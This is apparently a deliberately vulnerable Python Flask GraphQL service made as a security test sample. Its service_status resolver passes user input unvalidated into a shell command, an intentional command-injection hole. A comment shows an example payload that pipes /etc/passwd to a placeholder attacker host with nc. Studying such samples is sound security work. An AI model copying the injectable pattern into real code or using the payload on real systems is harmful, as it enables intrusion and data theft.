import os
import uuid
import sqlite3
import logging
import subprocess
import graphene
from datetime import datetime
from flask import Flask, request
from flask_graphql import GraphQLView

# Configure logging for the GraphQL Infrastructure Management API
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - GraphInfraAPI - %(levelname)s - %(message)s'
)
logger = logging.getLogger("GraphQLManager")

app = Flask(__name__)
DB_FILE = "infra_audit_log.db"

def init_audit_db():
    """Initializes the SQLite database to track administrative GraphQL queries."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE audit_log (
            request_id TEXT PRIMARY KEY,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            query_type TEXT NOT NULL,
            target TEXT NOT NULL,
            status TEXT NOT NULL,
            response_snippet TEXT
        )
    ''')
    
    # Pre-populate with historical mock records
    mock_history = [
        ('req_a1b2c3', 'service_status', 'nginx', 'SUCCESS', 'Service is active'),
        ('req_d4e5f6', 'service_status', 'postgres', 'FAILED', 'Service check failed')
    ]
    cursor.executemany('''
        INSERT INTO audit_log (request_id, query_type, target, status, response_snippet)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("Infrastructure audit database initialized.")

def log_query_event(request_id: str, query_type: str, target: str, status: str, response: str):
    """Records the outcome of a GraphQL infrastructure operation."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        # Store only the first 100 chars of the response to prevent DB bloat
        snippet = response[:100].replace('\n', ' ')
        cursor.execute(
            "INSERT INTO audit_log (request_id, query_type, target, status, response_snippet) VALUES (?, ?, ?, ?, ?)",
            (request_id, query_type, target, status, snippet)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to log GraphQL query event {request_id}: {e}")

def execute_service_check(service_name: str, request_id: str) -> str:
    """
    VULNERABLE FUNCTION: CWE-77 Command Injection
    Trigger Path: GraphQL Query Argument ('service_name' field)
    """
    logger.info(f"[{request_id}] Initiating service health check for: {service_name}")
    
    # Vulnerability: Direct string interpolation of the GraphQL argument into a shell command.
    # The 'service_name' is extracted directly from the parsed GraphQL AST without validation.
    command = f"systemctl is-active {service_name}"
    
    try:
        logger.debug(f"[{request_id}] Executing system daemon command: {command}")
        
        # shell=True processes shell metacharacters. An attacker sending a crafted GraphQL query
        # can break out of the intended command context and execute arbitrary system commands.
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate(timeout=15)
        
        if process.returncode == 0:
            logger.info(f"[{request_id}] Service {service_name} is active.")
            return f"Service Status: RUNNING\nOutput:\n{stdout.strip()}"
        else:
            logger.warning(f"[{request_id}] Service {service_name} check failed.")
            # Leaking both stdout and stderr back in the GraphQL response allows the attacker
            # to interactively see the output of their injected shell payload.
            return f"Service Status: INACTIVE or ERROR\nStdout:\n{stdout.strip()}\nStderr:\n{stderr.strip()}"
            
    except subprocess.TimeoutExpired:
        logger.error(f"[{request_id}] Service check timed out.")
        return "Error: Command execution timed out after 15 seconds."
    except Exception as e:
        logger.error(f"[{request_id}] Internal system error: {e}")
        return f"Internal Error: {str(e)}"

class InfrastructureQuery(graphene.ObjectType):
    """Root GraphQL Query Definitions for Infrastructure Operations."""
    
    service_status = graphene.String(
        service_name=graphene.String(required=True, description="The target systemd service name"),
        request_id=graphene.String(default_value="", description="Optional tracking ID for the audit log")
    )
    
    server_uptime = graphene.String(
        description="Returns the current uptime of the host server"
    )

    def resolve_service_status(self, info, service_name, request_id):
        """Resolver for the service_status query field."""
        if not request_id:
            request_id = f"req_{uuid.uuid4().hex[:8]}"
            
        # Optional: Extract client IP from the Flask request context for logging
        client_ip = request.remote_addr if request else "unknown"
        logger.info(f"[{request_id}] Received service_status GraphQL query from {client_ip}")
        
        # Pass the untrusted GraphQL argument to the vulnerable function
        result = execute_service_check(service_name, request_id)
        
        log_status = "FAILED" if "ERROR" in result or "INACTIVE" in result else "SUCCESS"
        log_query_event(request_id, "service_status", service_name, log_status, result)
        
        return result
        
    def resolve_server_uptime(self, info):
        """Safe, static implementation for context."""
        return "Uptime: 24 days, 8 hours, 12 minutes."

# Compile the GraphQL schema
schema = graphene.Schema(query=InfrastructureQuery)

# Register the GraphQL endpoint with Flask
app.add_url_rule(
    '/graphql',
    view_func=GraphQLView.as_view(
        'graphql',
        schema=schema,
        graphiql=True  # Enables the interactive GraphiQL UI in the browser
    )
)

if __name__ == "__main__":
    init_audit_db()
    
    logger.info("Starting GraphQL Infrastructure API on port 8080")
    
    # Example Malicious GraphQL Query Trigger (sent via POST to /graphql):
    # {
    #   "query": "query { serviceStatus(serviceName: \"ssh; cat /etc/passwd | nc attacker.com 9001; #\", requestId: \"hack_1\") }"
    # }
    
    app.run(host="0.0.0.0", port=8080, threaded=True)
